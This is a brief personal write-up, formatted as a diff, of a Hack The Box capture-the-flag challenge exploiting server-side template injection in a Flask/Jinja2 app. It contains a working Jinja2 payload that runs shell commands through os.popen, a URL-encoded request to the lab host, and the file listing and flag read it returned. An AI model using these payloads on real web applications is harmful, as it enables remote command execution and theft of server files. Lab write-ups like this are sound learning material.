@@ -1,0 +1,18 @@
+Hints in the name of the challenge
+>ran by flask/jinja2
+
+googled https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
+
+look for exploits i could use.
+
+>apply as many filter bypasses as I can. {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
+Typed in URL:
+http://134.209.186.36:32146/%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('ls%20-a').read()%7D%7D
+
+Result = The page '. .. bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var ' could not be found
+
+
+>{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}
+
+Resut = flag confirmed and accepted on HTB
